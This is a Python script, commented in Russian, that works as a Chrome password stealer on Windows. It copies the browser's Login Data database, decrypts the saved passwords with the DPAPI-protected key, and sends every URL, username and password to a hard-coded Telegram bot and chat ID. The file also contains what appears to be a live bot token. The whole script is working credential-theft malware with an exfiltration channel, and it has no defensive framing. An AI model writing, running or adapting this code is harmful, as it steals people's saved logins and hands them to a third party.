import os
import sqlite3
import json
import shutil
import base64
import win32crypt
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from telegram import Bot
import asyncio

# Замените 'YOUR_BOT_TOKEN' на токен вашего бота
TELEGRAM_BOT_TOKEN = '7558492008:AAE1ZrjixCRDGxRQaRhmkvXpJpADeIgX2gw'
# Замените 'YOUR_CHAT_ID' на ваш ID
CHAT_ID = '874924103'

async def send_passwords_to_telegram(passwords):
    bot = Bot(token=TELEGRAM_BOT_TOKEN)
    
    # Формируем сообщение
    message = "Пароли из Chrome:\n\n"
    
    for url, username, password in passwords:
        message += f"URL: {url}\nUsername: {username}\nPassword: {password}\n\n"

    # Разбиваем сообщение на части, если оно слишком длинное
    max_length = 4096
    for i in range(0, len(message), max_length):
        part = message[i:i + max_length]
        await bot.send_message(chat_id=CHAT_ID, text=part)

def get_chrome_passwords():
    local_app_data = os.getenv("LOCALAPPDATA")
    chrome_db = os.path.join(local_app_data, "Google", "Chrome", "User Data", "Default", "Login Data")

    if not os.path.exists(chrome_db):
        print(f"Файл не найден: {chrome_db}")
        return []

    shutil.copy2(chrome_db, "Login Data")

    conn = sqlite3.connect("Login Data")
    cursor = conn.cursor()

    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")

    passwords = []
    for row in cursor.fetchall():
        origin_url = row[0]
        username = row[1]
        password = decrypt_password(row[2])
        passwords.append((origin_url, username, password))

    cursor.close()
    conn.close()

    os.remove("Login Data")

    return passwords

def decrypt_password(ciphertext):
    local_app_data = os.getenv("LOCALAPPDATA")
    key_file = os.path.join(local_app_data, "Google", "Chrome", "User Data", "Local State")

    with open(key_file, "r", encoding="utf-8") as f:
        key_data = json.load(f)

        encrypted_key = base64.b64decode(key_data['os_crypt']['encrypted_key'])
        key = win32crypt.CryptUnprotectData(encrypted_key[5:])[1]

    nonce = ciphertext[3:15]
    tag = ciphertext[-16:]
    encrypted_password = ciphertext[15:-16]

    cipher = Cipher(algorithms.AES(key), modes.GCM(nonce, tag), backend=default_backend())
    decryptor = cipher.decryptor()
    decrypted_password = decryptor.update(encrypted_password) + decryptor.finalize()
    return decrypted_password.decode()

if __name__ == "__main__":
    passwords = get_chrome_passwords()
    if passwords:
        asyncio.run(send_passwords_to_telegram(passwords))
    else:
        print("Пароли не найдены.")